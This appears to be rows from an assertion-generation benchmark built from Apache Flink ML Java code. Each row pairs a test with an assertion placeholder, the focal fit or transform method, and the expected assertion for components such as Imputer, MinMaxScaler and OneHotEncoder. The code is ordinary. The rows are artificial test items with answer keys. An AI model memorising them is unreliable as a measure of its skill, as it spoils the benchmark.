fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument( getInputCols().length == getOutputCols().length, ""Num of input columns and output columns are inconsistent.""); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Row> inputData = tEnv.toDataStream(inputs[0]);  DataStream<ImputerModelData> modelData; switch (getStrategy()) { case MEAN: modelData = DataStreamUtils.aggregate( inputData, new MeanStrategyAggregator(getInputCols(), getMissingValue()), Types.MAP(Types.STRING, Types.TUPLE(Types.DOUBLE, Types.LONG)), ImputerModelData.TYPE_INFO); break; case MEDIAN: modelData = DataStreamUtils.aggregate( inputData, new MedianStrategyAggregator( getInputCols(), getMissingValue(), getRelativeError()), Types.MAP(Types.STRING, TypeInformation.of(QuantileSummary.class)), ImputerModelData.TYPE_INFO); break; case MOST_FREQUENT: modelData = DataStreamUtils.aggregate( inputData, new MostFrequentStrategyAggregator( getInputCols(), getMissingValue()), Types.MAP(Types.STRING, Types.MAP(Types.DOUBLE, Types.LONG)), ImputerModelData.TYPE_INFO); break; default: throw new RuntimeException(""Unsupported strategy of Imputer: "" + getStrategy()); }  Schema schema = Schema.newBuilder() .column(""surrogates"", DataTypes.MAP(DataTypes.STRING(), DataTypes.DOUBLE())) .build(); ImputerModel model = new ImputerModel().setModelData(tEnv.fromDataStream(modelData, schema)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Arrays.asList(""f1"", ""f2"", ""f3"", ""f4"", ""o1"", ""o2"", ""o3"", ""o4""), output.getResolvedSchema().getColumnNames())"
"Exception { Imputer imputer = new Imputer() .setInputCols(""f1"", ""f2"", ""f3"", ""f4"") .setOutputCols(""o1"", ""o2"", ""o3"", ""o4""); Imputer loadedImputer = TestUtils.saveAndReload( tEnv, imputer, tempFolder.newFolder().getAbsolutePath(), Imputer::load); ImputerModel model = loadedImputer.fit(trainDataTable); ImputerModel loadedModel = TestUtils.saveAndReload( tEnv, model, tempFolder.newFolder().getAbsolutePath(), ImputerModel::load); ""<AssertPlaceHolder>""; Table output = loadedModel.transform(predictDataTable)[0]; verifyPredictionResult( output, Arrays.asList(imputer.getOutputCols()), EXPECTED_MEAN_STRATEGY_OUTPUT); }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument( getInputCols().length == getOutputCols().length, ""Num of input columns and output columns are inconsistent.""); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Row> inputData = tEnv.toDataStream(inputs[0]);  DataStream<ImputerModelData> modelData; switch (getStrategy()) { case MEAN: modelData = DataStreamUtils.aggregate( inputData, new MeanStrategyAggregator(getInputCols(), getMissingValue()), Types.MAP(Types.STRING, Types.TUPLE(Types.DOUBLE, Types.LONG)), ImputerModelData.TYPE_INFO); break; case MEDIAN: modelData = DataStreamUtils.aggregate( inputData, new MedianStrategyAggregator( getInputCols(), getMissingValue(), getRelativeError()), Types.MAP(Types.STRING, TypeInformation.of(QuantileSummary.class)), ImputerModelData.TYPE_INFO); break; case MOST_FREQUENT: modelData = DataStreamUtils.aggregate( inputData, new MostFrequentStrategyAggregator( getInputCols(), getMissingValue()), Types.MAP(Types.STRING, Types.MAP(Types.DOUBLE, Types.LONG)), ImputerModelData.TYPE_INFO); break; default: throw new RuntimeException(""Unsupported strategy of Imputer: "" + getStrategy()); }  Schema schema = Schema.newBuilder() .column(""surrogates"", DataTypes.MAP(DataTypes.STRING(), DataTypes.DOUBLE())) .build(); ImputerModel model = new ImputerModel().setModelData(tEnv.fromDataStream(modelData, schema)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Collections.singletonList(""surrogates""), model.getModelData()[0].getResolvedSchema().getColumnNames())"
"testFitOnEmptyData() { Table emptyTable = tEnv.fromDataStream(env.fromCollection(TRAIN_DATA).filter(x -> x.getArity() == 0)) .as(""f1"", ""f2"", ""f3"", ""f4"");  strategyAndExpectedOutputs.remove(MEDIAN); for (Map.Entry<String, List<Row>> entry : strategyAndExpectedOutputs.entrySet()) { Imputer imputer = new Imputer() .setInputCols(""f1"", ""f2"", ""f3"", ""f4"") .setOutputCols(""o1"", ""o2"", ""o3"", ""o4"") .setStrategy(entry.getKey()); ImputerModel model = imputer.fit(emptyTable); Table modelDataTable = model.getModelData()[0]; try { modelDataTable.execute().print(); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument( getInputCols().length == getOutputCols().length, ""Num of input columns and output columns are inconsistent.""); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Row> inputData = tEnv.toDataStream(inputs[0]);  DataStream<ImputerModelData> modelData; switch (getStrategy()) { case MEAN: modelData = DataStreamUtils.aggregate( inputData, new MeanStrategyAggregator(getInputCols(), getMissingValue()), Types.MAP(Types.STRING, Types.TUPLE(Types.DOUBLE, Types.LONG)), ImputerModelData.TYPE_INFO); break; case MEDIAN: modelData = DataStreamUtils.aggregate( inputData, new MedianStrategyAggregator( getInputCols(), getMissingValue(), getRelativeError()), Types.MAP(Types.STRING, TypeInformation.of(QuantileSummary.class)), ImputerModelData.TYPE_INFO); break; case MOST_FREQUENT: modelData = DataStreamUtils.aggregate( inputData, new MostFrequentStrategyAggregator( getInputCols(), getMissingValue()), Types.MAP(Types.STRING, Types.MAP(Types.DOUBLE, Types.LONG)), ImputerModelData.TYPE_INFO); break; default: throw new RuntimeException(""Unsupported strategy of Imputer: "" + getStrategy()); }  Schema schema = Schema.newBuilder() .column(""surrogates"", DataTypes.MAP(DataTypes.STRING(), DataTypes.DOUBLE())) .build(); ImputerModel model = new ImputerModel().setModelData(tEnv.fromDataStream(modelData, schema)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( ""The training set is empty or does not contains valid data."", ExceptionUtils.getRootCause(e).getMessage())"
"testNoValidDataOnMedianStrategy() { final List<Row> trainData = new ArrayList<>( Arrays.asList( Row.of(Double.NaN, 3.0f), Row.of(null, 2.0f), Row.of(1.0, 1.0f))); trainDataTable = tEnv.fromDataStream(env.fromCollection(trainData)).as(""f1"", ""f2""); Imputer imputer = new Imputer() .setInputCols(""f1"", ""f2"") .setOutputCols(""o1"", ""o2"") .setStrategy(MEDIAN) .setMissingValue(1.0); ImputerModel model = imputer.fit(trainDataTable); Table modelDataTable = model.getModelData()[0]; try { modelDataTable.execute().print(); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument( getInputCols().length == getOutputCols().length, ""Num of input columns and output columns are inconsistent.""); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Row> inputData = tEnv.toDataStream(inputs[0]);  DataStream<ImputerModelData> modelData; switch (getStrategy()) { case MEAN: modelData = DataStreamUtils.aggregate( inputData, new MeanStrategyAggregator(getInputCols(), getMissingValue()), Types.MAP(Types.STRING, Types.TUPLE(Types.DOUBLE, Types.LONG)), ImputerModelData.TYPE_INFO); break; case MEDIAN: modelData = DataStreamUtils.aggregate( inputData, new MedianStrategyAggregator( getInputCols(), getMissingValue(), getRelativeError()), Types.MAP(Types.STRING, TypeInformation.of(QuantileSummary.class)), ImputerModelData.TYPE_INFO); break; case MOST_FREQUENT: modelData = DataStreamUtils.aggregate( inputData, new MostFrequentStrategyAggregator( getInputCols(), getMissingValue()), Types.MAP(Types.STRING, Types.MAP(Types.DOUBLE, Types.LONG)), ImputerModelData.TYPE_INFO); break; default: throw new RuntimeException(""Unsupported strategy of Imputer: "" + getStrategy()); }  Schema schema = Schema.newBuilder() .column(""surrogates"", DataTypes.MAP(DataTypes.STRING(), DataTypes.DOUBLE())) .build(); ImputerModel model = new ImputerModel().setModelData(tEnv.fromDataStream(modelData, schema)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( ""Surrogate cannot be computed. All the values in column [f1] are null, NaN or missingValue."", ExceptionUtils.getRootCause(e).getMessage())"
"testInconsistentInputsAndOutputs() { Imputer imputer = new Imputer().setInputCols(""f1"", ""f2"", ""f3"", ""f4"").setOutputCols(""o1"", ""o2"", ""o3""); try { imputer.fit(trainDataTable); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument( getInputCols().length == getOutputCols().length, ""Num of input columns and output columns are inconsistent.""); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Row> inputData = tEnv.toDataStream(inputs[0]);  DataStream<ImputerModelData> modelData; switch (getStrategy()) { case MEAN: modelData = DataStreamUtils.aggregate( inputData, new MeanStrategyAggregator(getInputCols(), getMissingValue()), Types.MAP(Types.STRING, Types.TUPLE(Types.DOUBLE, Types.LONG)), ImputerModelData.TYPE_INFO); break; case MEDIAN: modelData = DataStreamUtils.aggregate( inputData, new MedianStrategyAggregator( getInputCols(), getMissingValue(), getRelativeError()), Types.MAP(Types.STRING, TypeInformation.of(QuantileSummary.class)), ImputerModelData.TYPE_INFO); break; case MOST_FREQUENT: modelData = DataStreamUtils.aggregate( inputData, new MostFrequentStrategyAggregator( getInputCols(), getMissingValue()), Types.MAP(Types.STRING, Types.MAP(Types.DOUBLE, Types.LONG)), ImputerModelData.TYPE_INFO); break; default: throw new RuntimeException(""Unsupported strategy of Imputer: "" + getStrategy()); }  Schema schema = Schema.newBuilder() .column(""surrogates"", DataTypes.MAP(DataTypes.STRING(), DataTypes.DOUBLE())) .build(); ImputerModel model = new ImputerModel().setModelData(tEnv.fromDataStream(modelData, schema)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( ""Num of input columns and output columns are inconsistent."", e.getMessage())"
"testOutputSchema() { Interaction interaction = new Interaction().setInputCols(""f0"", ""f1"", ""f2"", ""f3"").setOutputCol(""outputVec"");  Table output = interaction.transform(inputDataTable)[0];  ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema()); RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), VectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol()));  DataStream<Row> output = tEnv.toDataStream(inputs[0]) .map(new InteractionFunction(getInputCols()), outputTypeInfo); Table outputTable = tEnv.fromDataStream(output);  return new Table[] {outputTable}; }"	"assertEquals( Arrays.asList(""f0"", ""f1"", ""f2"", ""f3"", ""outputVec""), output.getResolvedSchema().getColumnNames())"
"testOutputSchema() { Table tempTable = tEnv.fromDataStream(env.fromElements(Row.of("""", """"))) .as(""test_input"", ""dummy_input""); KBinsDiscretizer kBinsDiscretizer = new KBinsDiscretizer().setInputCol(""test_input"").setOutputCol(""test_output""); Table output = kBinsDiscretizer.fit(tempTable).transform(tempTable)[0];  ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  String inputCol = getInputCol(); String strategy = getStrategy(); int numBins = getNumBins();  DataStream<DenseVector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, DenseVector>) value -> ((Vector) value.getField(inputCol)).toDense());  DataStream<DenseVector> preprocessedData; if (strategy.equals(UNIFORM)) { preprocessedData = inputData .transform( ""reduceInEachPartition"", inputData.getType(), new MinMaxReduceFunctionOperator()) .transform( ""reduceInFinalPartition"", inputData.getType(), new MinMaxReduceFunctionOperator()) .setParallelism(1); } else { preprocessedData = DataStreamUtils.sample( inputData, getSubSamples(), getClass().getName().hashCode()); }  DataStream<KBinsDiscretizerModelData> modelData = DataStreamUtils.mapPartition( preprocessedData, new MapPartitionFunction<DenseVector, KBinsDiscretizerModelData>() { @Override public void mapPartition( Iterable<DenseVector> iterable, Collector<KBinsDiscretizerModelData> collector) { List<DenseVector> list = new ArrayList<>(); iterable.iterator().forEachRemaining(list::add);  if (list.size() == 0) { throw new RuntimeException(""The training set is empty.""); }  double[][] binEdges; switch (strategy) { case UNIFORM: binEdges = findBinEdgesWithUniformStrategy(list, numBins); break; case QUANTILE: binEdges = findBinEdgesWithQuantileStrategy(list, numBins); break; case KMEANS: binEdges = findBinEdgesWithKMeansStrategy(list, numBins); break; default: throw new UnsupportedOperationException( ""Unsupported "" + STRATEGY + "" type: "" + strategy + "".""); }  collector.collect(new KBinsDiscretizerModelData(binEdges)); } }); modelData.getTransformation().setParallelism(1);  KBinsDiscretizerModel model = new KBinsDiscretizerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Arrays.asList(""test_input"", ""dummy_input"", ""test_output""), output.getResolvedSchema().getColumnNames())"
"Exception { KBinsDiscretizer kBinsDiscretizer = new KBinsDiscretizer().setNumBins(3).setStrategy(KBinsDiscretizerParams.UNIFORM); kBinsDiscretizer = TestUtils.saveAndReload( tEnv, kBinsDiscretizer, tempFolder.newFolder().getAbsolutePath(), KBinsDiscretizer::load);  KBinsDiscretizerModel model = kBinsDiscretizer.fit(trainTable); model = TestUtils.saveAndReload( tEnv, model, tempFolder.newFolder().getAbsolutePath(), KBinsDiscretizerModel::load);  ""<AssertPlaceHolder>"";  Table output = model.transform(testTable)[0]; verifyPredictionResult(UNIFORM_OUTPUT, output, kBinsDiscretizer.getOutputCol()); }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  String inputCol = getInputCol(); String strategy = getStrategy(); int numBins = getNumBins();  DataStream<DenseVector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, DenseVector>) value -> ((Vector) value.getField(inputCol)).toDense());  DataStream<DenseVector> preprocessedData; if (strategy.equals(UNIFORM)) { preprocessedData = inputData .transform( ""reduceInEachPartition"", inputData.getType(), new MinMaxReduceFunctionOperator()) .transform( ""reduceInFinalPartition"", inputData.getType(), new MinMaxReduceFunctionOperator()) .setParallelism(1); } else { preprocessedData = DataStreamUtils.sample( inputData, getSubSamples(), getClass().getName().hashCode()); }  DataStream<KBinsDiscretizerModelData> modelData = DataStreamUtils.mapPartition( preprocessedData, new MapPartitionFunction<DenseVector, KBinsDiscretizerModelData>() { @Override public void mapPartition( Iterable<DenseVector> iterable, Collector<KBinsDiscretizerModelData> collector) { List<DenseVector> list = new ArrayList<>(); iterable.iterator().forEachRemaining(list::add);  if (list.size() == 0) { throw new RuntimeException(""The training set is empty.""); }  double[][] binEdges; switch (strategy) { case UNIFORM: binEdges = findBinEdgesWithUniformStrategy(list, numBins); break; case QUANTILE: binEdges = findBinEdgesWithQuantileStrategy(list, numBins); break; case KMEANS: binEdges = findBinEdgesWithKMeansStrategy(list, numBins); break; default: throw new UnsupportedOperationException( ""Unsupported "" + STRATEGY + "" type: "" + strategy + "".""); }  collector.collect(new KBinsDiscretizerModelData(binEdges)); } }); modelData.getTransformation().setParallelism(1);  KBinsDiscretizerModel model = new KBinsDiscretizerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Collections.singletonList(""binEdges""), model.getModelData()[0].getResolvedSchema().getColumnNames())"
"testFitOnEmptyData() { Table emptyTable = tEnv.fromDataStream(env.fromCollection(TRAIN_INPUT).filter(x -> x.getArity() == 0)) .as(""input""); KBinsDiscretizerModel model = new KBinsDiscretizer().fit(emptyTable); Table modelDataTable = model.getModelData()[0]; try { modelDataTable.execute().collect().next(); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  String inputCol = getInputCol(); String strategy = getStrategy(); int numBins = getNumBins();  DataStream<DenseVector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, DenseVector>) value -> ((Vector) value.getField(inputCol)).toDense());  DataStream<DenseVector> preprocessedData; if (strategy.equals(UNIFORM)) { preprocessedData = inputData .transform( ""reduceInEachPartition"", inputData.getType(), new MinMaxReduceFunctionOperator()) .transform( ""reduceInFinalPartition"", inputData.getType(), new MinMaxReduceFunctionOperator()) .setParallelism(1); } else { preprocessedData = DataStreamUtils.sample( inputData, getSubSamples(), getClass().getName().hashCode()); }  DataStream<KBinsDiscretizerModelData> modelData = DataStreamUtils.mapPartition( preprocessedData, new MapPartitionFunction<DenseVector, KBinsDiscretizerModelData>() { @Override public void mapPartition( Iterable<DenseVector> iterable, Collector<KBinsDiscretizerModelData> collector) { List<DenseVector> list = new ArrayList<>(); iterable.iterator().forEachRemaining(list::add);  if (list.size() == 0) { throw new RuntimeException(""The training set is empty.""); }  double[][] binEdges; switch (strategy) { case UNIFORM: binEdges = findBinEdgesWithUniformStrategy(list, numBins); break; case QUANTILE: binEdges = findBinEdgesWithQuantileStrategy(list, numBins); break; case KMEANS: binEdges = findBinEdgesWithKMeansStrategy(list, numBins); break; default: throw new UnsupportedOperationException( ""Unsupported "" + STRATEGY + "" type: "" + strategy + "".""); }  collector.collect(new KBinsDiscretizerModelData(binEdges)); } }); modelData.getTransformation().setParallelism(1);  KBinsDiscretizerModel model = new KBinsDiscretizerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals(""The training set is empty."", ExceptionUtils.getRootCause(e).getMessage())"
"testOutputSchema() { MaxAbsScaler maxAbsScaler = new MaxAbsScaler().setInputCol(""test_input"").setOutputCol(""test_output"");  MaxAbsScalerModel model = maxAbsScaler.fit(trainDataTable.as(""test_input"")); Table output = model.transform(predictDataTable.as(""test_input""))[0]; ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  DataStream<Vector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, Vector>) value -> ((Vector) value.getField(inputCol)), VectorTypeInfo.INSTANCE);  DataStream<Vector> maxAbsValues = inputData .transform( ""reduceInEachPartition"", VectorTypeInfo.INSTANCE, new MaxAbsReduceFunctionOperator()) .transform( ""reduceInFinalPartition"", VectorTypeInfo.INSTANCE, new MaxAbsReduceFunctionOperator()) .setParallelism(1);  DataStream<MaxAbsScalerModelData> modelData = maxAbsValues.map( (MapFunction<Vector, MaxAbsScalerModelData>) vector -> new MaxAbsScalerModelData((DenseVector) vector));  MaxAbsScalerModel model = new MaxAbsScalerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Arrays.asList(""test_input"", ""test_output""), output.getResolvedSchema().getColumnNames())"
"testFitDataWithNullValue() { List<Row> trainData = new ArrayList<>( Arrays.asList( Row.of(Vectors.dense(0.0, 3.0)), Row.of(Vectors.dense(2.1, 0.0)), Row.of((Object) null), Row.of(Vectors.dense(6.1, 8.1)), Row.of(Vectors.dense(200, 400))));  Table trainDataWithInvalidData = tEnv.fromDataStream(env.fromCollection(trainData)).as(""input"");  try { MaxAbsScaler maxAbsScaler = new MaxAbsScaler(); MaxAbsScalerModel model = maxAbsScaler.fit(trainDataWithInvalidData); IteratorUtils.toList(tEnv.toDataStream(model.getModelData()[0]).executeAndCollect()); fail(); } catch (Exception e) { ""<AssertPlaceHolder>""; } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  DataStream<Vector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, Vector>) value -> ((Vector) value.getField(inputCol)), VectorTypeInfo.INSTANCE);  DataStream<Vector> maxAbsValues = inputData .transform( ""reduceInEachPartition"", VectorTypeInfo.INSTANCE, new MaxAbsReduceFunctionOperator()) .transform( ""reduceInFinalPartition"", VectorTypeInfo.INSTANCE, new MaxAbsReduceFunctionOperator()) .setParallelism(1);  DataStream<MaxAbsScalerModelData> modelData = maxAbsValues.map( (MapFunction<Vector, MaxAbsScalerModelData>) vector -> new MaxAbsScalerModelData((DenseVector) vector));  MaxAbsScalerModel model = new MaxAbsScalerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( ""The vector must not be null."", ExceptionUtils.getRootCause(e).getMessage())"
"testOutputSchema() { MinMaxScaler minMaxScaler = new MinMaxScaler() .setInputCol(""test_input"") .setOutputCol(""test_output"") .setMin(1.0) .setMax(4.0);  MinMaxScalerModel model = minMaxScaler.fit(trainDataTable.as(""test_input"")); Table output = model.transform(predictDataTable.as(""test_input""))[0]; ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<DenseVector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, DenseVector>) value -> ((Vector) value.getField(inputCol)).toDense()); DataStream<DenseVector> minMaxValues = inputData .transform( ""reduceInEachPartition"", inputData.getType(), new MinMaxReduceFunctionOperator()) .transform( ""reduceInFinalPartition"", inputData.getType(), new MinMaxReduceFunctionOperator()) .setParallelism(1); DataStream<MinMaxScalerModelData> modelData = DataStreamUtils.mapPartition( minMaxValues, new RichMapPartitionFunction<DenseVector, MinMaxScalerModelData>() { @Override public void mapPartition( Iterable<DenseVector> values, Collector<MinMaxScalerModelData> out) { Iterator<DenseVector> iter = values.iterator(); DenseVector minVector = iter.next(); DenseVector maxVector = iter.next(); out.collect(new MinMaxScalerModelData(minVector, maxVector)); } });  MinMaxScalerModel model = new MinMaxScalerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Arrays.asList(""test_input"", ""test_output""), output.getResolvedSchema().getColumnNames())"
"Exception { MinMaxScaler minMaxScaler = new MinMaxScaler(); MinMaxScaler loadedMinMaxScaler = TestUtils.saveAndReload( tEnv, minMaxScaler, tempFolder.newFolder().getAbsolutePath(), MinMaxScaler::load); MinMaxScalerModel model = loadedMinMaxScaler.fit(trainDataTable); MinMaxScalerModel loadedModel = TestUtils.saveAndReload( tEnv, model, tempFolder.newFolder().getAbsolutePath(), MinMaxScalerModel::load); ""<AssertPlaceHolder>""; Table output = loadedModel.transform(predictDataTable)[0]; verifyPredictionResult(output, minMaxScaler.getOutputCol(), EXPECTED_DATA); }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<DenseVector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, DenseVector>) value -> ((Vector) value.getField(inputCol)).toDense()); DataStream<DenseVector> minMaxValues = inputData .transform( ""reduceInEachPartition"", inputData.getType(), new MinMaxReduceFunctionOperator()) .transform( ""reduceInFinalPartition"", inputData.getType(), new MinMaxReduceFunctionOperator()) .setParallelism(1); DataStream<MinMaxScalerModelData> modelData = DataStreamUtils.mapPartition( minMaxValues, new RichMapPartitionFunction<DenseVector, MinMaxScalerModelData>() { @Override public void mapPartition( Iterable<DenseVector> values, Collector<MinMaxScalerModelData> out) { Iterator<DenseVector> iter = values.iterator(); DenseVector minVector = iter.next(); DenseVector maxVector = iter.next(); out.collect(new MinMaxScalerModelData(minVector, maxVector)); } });  MinMaxScalerModel model = new MinMaxScalerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Arrays.asList(""minVector"", ""maxVector""), model.getModelData()[0].getResolvedSchema().getColumnNames())"
"testOutputSchema() { NGram nGram = new NGram(); inputDataTable = tEnv.fromDataStream(env.fromElements(Row.of(new String[] {""""}, """"))) .as(""input"", ""dummyInput""); Table output = nGram.transform(inputDataTable)[0]; ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Expression nGramUdf = Expressions.call(NGramUdf.class, $(getInputCol()), getN()).as(getOutputCol()); Table output = inputs[0].addColumns(nGramUdf); return new Table[] {output}; }"	"assertEquals( Arrays.asList(nGram.getInputCol(), ""dummyInput"", nGram.getOutputCol()), output.getResolvedSchema().getColumnNames())"
"testOutputSchema() { Normalizer normalizer = new Normalizer().setInputCol(""denseVec"").setOutputCol(""outputVec"").setP(1.5);  Table output = normalizer.transform(inputDataTable)[0];  ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema());  RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), VectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol()));  DataStream<Row> output = tEnv.toDataStream(inputs[0]) .map(new NormalizationFunction(getP(), getInputCol()), outputTypeInfo);  Table outputTable = tEnv.fromDataStream(output); return new Table[] {outputTable}; }"	"assertEquals( Arrays.asList(""denseVec"", ""sparseVec"", ""outputVec""), output.getResolvedSchema().getColumnNames())"
"testInvalidP() { try { Normalizer normalizer = new Normalizer().setInputCol(""denseVec"").setOutputCol(""outputVec"").setP(0.5); normalizer.transform(inputDataTable); fail(); } catch (Exception e) { ""<AssertPlaceHolder>""; } }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema());  RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), VectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol()));  DataStream<Row> output = tEnv.toDataStream(inputs[0]) .map(new NormalizationFunction(getP(), getInputCol()), outputTypeInfo);  Table outputTable = tEnv.fromDataStream(output); return new Table[] {outputTable}; }"	"assertEquals(""Parameter p is given an invalid value 0.5"", e.getMessage())"
"testFitAndPredict() { OneHotEncoderModel model = estimator.fit(trainTable); Table outputTable = model.transform(predictTable)[0]; Map<Double, Vector>[] actualOutput = executeAndCollect(outputTable, model.getInputCols(), model.getOutputCols()); ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument(getHandleInvalid().equals(ERROR_INVALID));  final String[] inputCols = getInputCols();  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Integer[]> localMaxIndices = tEnv.toDataStream(inputs[0]) .transform( ""ExtractInputValueAndFindMaxIndexOperator"", ObjectArrayTypeInfo.getInfoFor(BasicTypeInfo.INT_TYPE_INFO), new ExtractInputValueAndFindMaxIndexOperator(inputCols));  DataStream<Tuple2<Integer, Integer>> modelData = localMaxIndices .transform( ""GenerateModelDataOperator"", TupleTypeInfo.getBasicTupleTypeInfo(Integer.class, Integer.class), new GenerateModelDataOperator(inputCols.length)) .setParallelism(1);  OneHotEncoderModel model = new OneHotEncoderModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	assertArrayEquals(expectedOutput, actualOutput)
"testDropLast() { estimator.setDropLast(false);  expectedOutput = new HashMap[] { new HashMap<Double, Vector>() { { put(0.0, Vectors.sparse(3, new int[] {0}, new double[] {1.0})); put(1.0, Vectors.sparse(3, new int[] {1}, new double[] {1.0})); put(2.0, Vectors.sparse(3, new int[] {2}, new double[] {1.0})); } } };  OneHotEncoderModel model = estimator.fit(trainTable); Table outputTable = model.transform(predictTable)[0]; Map<Double, Vector>[] actualOutput = executeAndCollect(outputTable, model.getInputCols(), model.getOutputCols()); ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument(getHandleInvalid().equals(ERROR_INVALID));  final String[] inputCols = getInputCols();  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Integer[]> localMaxIndices = tEnv.toDataStream(inputs[0]) .transform( ""ExtractInputValueAndFindMaxIndexOperator"", ObjectArrayTypeInfo.getInfoFor(BasicTypeInfo.INT_TYPE_INFO), new ExtractInputValueAndFindMaxIndexOperator(inputCols));  DataStream<Tuple2<Integer, Integer>> modelData = localMaxIndices .transform( ""GenerateModelDataOperator"", TupleTypeInfo.getBasicTupleTypeInfo(Integer.class, Integer.class), new GenerateModelDataOperator(inputCols.length)) .setParallelism(1);  OneHotEncoderModel model = new OneHotEncoderModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	assertArrayEquals(expectedOutput, actualOutput)
